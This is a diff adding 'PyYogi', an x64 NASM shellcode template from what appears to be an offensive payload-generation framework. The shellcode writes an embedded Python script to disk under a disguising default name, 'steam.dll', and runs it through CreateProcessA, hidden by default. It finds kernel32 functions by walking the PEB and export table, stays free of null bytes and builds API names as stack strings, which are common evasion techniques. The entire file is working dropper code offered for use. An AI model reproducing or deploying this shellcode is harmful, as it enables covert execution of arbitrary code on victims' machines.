@@ -1,0 +1,239 @@
+#!name##PyYogi
+#!itemType##scode
+#!info##Shellcode designed for large Python scripts, even those hundreds of kilobytes in size. In theory, it can embed scripts of virtually any size and should still work. When executed, the shellcode creates a file, writes the embedded Python script into it, and launches it using 'CreateProcessA'.
+#!lang##nasm
+#!hiveType##SCode
+#!Var##PYY_hide##False##A parameter that determines whether the CreateProcessA execution will run the code in a visible CMD window or keep it hidden. Accepts "True" or "False"; by default, the execution is hidden.##str
+#!Var##PYY_fname##steam.dll##Name of the file to which the payload will be saved.##str
+#!payloadSpace##PYY_script##Python script
+
+{% set PYY_payload_loader = "python " + PYY_fname %}
+
+{% if PYY_hide == "True" or PYY_hide == True %}
+%define SHOW_PROCESS 0x08000000
+{% else %}
+%define SHOW_PROCESS 0
+{% endif %}
+
+BITS 64
+
+
+section .text
+global main
+main:
+    
+    call payload
+
+    ;File name
+    db {{asmTOOL.ConvertHexBytes(PYY_fname)}}
+    
+
+payload:
+    pop r14     ; save file name to r14
+    call crFile
+
+payload_data:
+    ; Payload Data
+    {{asmTOOL.ConvertHexBytesPart(PYY_script)}}
+payload_end:
+
+
+    ; Create File
+crFile:
+    pop r13 ; put pointer to payload r13
+    mov rcx, 0x000000000041656c
+    push rcx
+    mov rcx, 0x6946657461657243
+    push rcx
+    mov rcx, rsp
+    sub rsp, 32
+    call Duck
+    add rsp, 32 + 16
+    sub rsp, 56 + 16
+    mov rcx, r14
+    mov rdx, 0x10000000
+    mov r8, 0
+    mov r9, 0
+    mov qword [rsp+32], 2
+    mov qword [rsp+40], 0x80
+    mov qword [rsp+48], 0
+    call rax ; CreateFileA
+    add rsp, 56 + 16
+    mov r14, rax    ; save file handle
+    
+    ; write file
+    mov rcx, 0x0000000000000065
+    push rcx
+    mov rcx, 0x6c69466574697257
+    push rcx
+    mov rcx, rsp
+    sub rsp, 32
+    call Duck
+    add rsp, 32 + 16
+    mov rcx, 0
+    push rcx
+    push rcx
+    mov r9, rsp     ; pointer to buffer
+    sub rsp, 56
+    mov rcx, r14    ; file handle
+    mov rdx, r13    ; pointer to payload
+    mov r8, payload_end - payload_data - 1
+    mov qword [rsp+32], 0
+    call rax
+    add rsp, 56 + 16
+    
+
+    call prepare_proc
+cmd_line:
+    db {{asmTOOL.ConvertHexBytes(PYY_payload_loader)}}
+
+prepare_proc:
+    pop r14     ; save cmd
+    
+    mov rcx, 0x000041737365636f
+    push rcx
+    mov rcx, 0x7250657461657243
+    push rcx
+    mov rcx, rsp    ; 
+    sub rsp, 32
+    call Duck
+    add rsp, 32 + 16
+    mov r15, rax    ; save func addr
+    ; r14 - command line
+    ; r15 - func addr
+    
+    ; create STARTUPINFO struct and fill zeros
+    sub rsp, 128    ; make 128 bytes
+    lea rdi, [rsp]    ; buff addr
+    mov ecx, 128  / 8   ; bytes number
+    xor rax, rax    ; value
+    cld
+    rep stosq
+    
+    lea r10, [rsp]  ; save pointer to struct. This same: mov r10, rsp
+    mov dword [r10], 104
+    
+    ; create PROCESS_INFORMATION structure and fill zeros
+    sub rsp, 32
+    mov rdi, rsp    ; buff addr
+    mov ecx, 32 / 8   ; bytes num
+    xor rax, rax
+    cld
+    rep stosq
+    
+    lea r11, [rsp]  ; save pointer to struct. This same: mov r10, rsp
+    
+    ; CreateProcessA
+    mov rdx, rsp
+    sub rsp, 88
+    xor rcx, rcx
+    mov rdx, r14
+    mov r8, 0
+    mov r9, 0
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], SHOW_PROCESS
+    mov qword [rsp+48], 0
+    mov qword [rsp+56], 0
+    mov [rsp+64], r10
+    mov [rsp+72], r11
+    call r15
+    
+    add rsp, 88 + 160 
+  
+    ret
+    
+    
+
+Duck:
+    ; find function name in kernel32
+    ; Null bytes free
+    ; IN: rcx - pointer to function name
+    ; OUT: rax - function address
+    
+    push rbp
+    mov rbp, rsp
+    push rsi
+    push rdi
+    push r14
+    push r15
+    sub rsp, 16     ; space for local variable
+    mov [rbp-8], rcx    ; function name
+
+    
+    ; get kernel32 and Export Table address
+    ; r14 - kernel32 addr
+    ; r15 - export table
+    xor rcx, rcx
+    mov rcx, gs:[rcx+0x60]  ; Get address of PEB struct (avoid null bytes)
+    mov rcx, [rcx+0x18]     ; Get PEB_LDR_DATA address
+    mov rcx, [rcx+0x20]     ; Get InMemoryOrderModuleList
+    mov rcx, [rcx]      ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rcx, [rcx]      ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov r14, [rcx+0x20] ; Get kernel32.dll address
+    
+    xor rcx, rcx
+    mov ecx, [r14+0x3c] ; get pointer to PE header  (pointer have RVAddress )
+    add rcx, r14    ; RVA PE header + kernel32 = VA PE header of kernel32
+    add rcx, 0x44
+    add rcx, 0x44   ;  0x88 bytes after the PE signature is the RVA for the Export Table
+    mov r15d, [rcx]  ; get RVA of Export Table
+    add r15, r14    ; RVA export table + VA kernel32 = VA export table
+    
+    mov r8d , [r15+0x14]     ; get number of function
+    xor rdx, rdx    ; 'function number' counter
+    xor r9, r9
+    xor rcx, rcx  ; 
+    ; r8 - number of function
+    ; rdx - actual function number
+    ; r10 - length function name
+    xor r10, r10    ; str len counter
+    mov rax, [rbp-8]
+    .match_len:
+        mov byte cl, [rax+r10]
+        cmp cl, r9b
+        je .find_name
+        inc r10
+        jmp .match_len
+    
+    .find_name:
+        cmp rdx, r8     ; check function limit
+        jg .not_find
+        mov esi, [r15+0x20]     ; RVA function name from export table
+        add rsi, r14        ; RVA function name + VA kernel32 = VA function name
+        mov esi, [rsi+4*rdx]    ; get next entry RVA function name
+        add rsi, r14        ; RVA name + kernel32 addr
+        ; rsi = function name from export table
+        ; compare function name
+        mov rdi, [rbp-8]    ; our func name
+        mov rcx, r10    ; func name length
+        cld
+        repe cmpsb
+        jnz .check_next
+        
+        ; get function addres
+        mov edi, [r15+0x24]     ; get AddressOfNameOrdinals RVA
+        add rdi, r14        ; AddressOfNameOrdinals RVA + kernel32 VA
+        xor rsi, rsi
+        mov si, [rdi+2*rdx]    ; get function index (word) to function address
+        mov edi, [r15+0x1c]     ; get AddressOfFunctions RVA
+        add rdi, r14    ; AddressOfFunctions RVA + kernel32 VA
+        mov edi, [rdi+4*rsi]    ; get RVA function address
+        add rdi, r14    ; function addr RVA + kernel32 VA
+        mov rax, rdi    ; return func addr
+    
+    .return:
+        add rsp, 16 ; restore stack
+        pop r15
+        pop r14
+        pop rdi
+        pop rsi
+        pop rbp
+        ret
+     
+     .not_find:
+        xor rax, rax
+        jmp .return
+        
+    .check_next:
+        inc rdx     ; increase main func counter
+        jmp .find_name
